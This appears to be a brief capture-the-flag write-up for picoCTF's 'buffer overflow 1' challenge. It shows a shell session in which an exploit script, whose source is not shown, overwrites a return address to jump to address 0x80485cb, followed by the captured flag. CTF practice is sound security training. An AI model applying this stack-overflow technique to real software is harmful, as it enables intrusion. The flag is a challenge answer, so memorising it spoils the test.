# buffer overflow 1 - Points: 200 - (Solves: 317)

Okay now you're cooking!
This time can you overflow the buffer and return to the flag function
in this [program][2]?

You can find it in

    /problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613

on the shell server.

[Source][1]

[1]: https://2018shell2.picoctf.com/static/d6146450a41960f6ce43dbfb300d9ef4/vuln.c
[2]: https://2018shell2.picoctf.com/static/d6146450a41960f6ce43dbfb300d9ef4/vuln

---

Server shell

```sh
% cd
% ln -s /problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613/flag.txt ~/
% python xpwn.py
[*] '/problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613/vuln': pid 4092622
[+] Receiving all data: Done (99B)
[*] Process '/problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613/vuln' stopped with exit code -11 (SIGSEGV) (pid 4092622)
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy3656a9b3}
```

picoCTF{addr3ss3s_ar3_3asy3656a9b3}
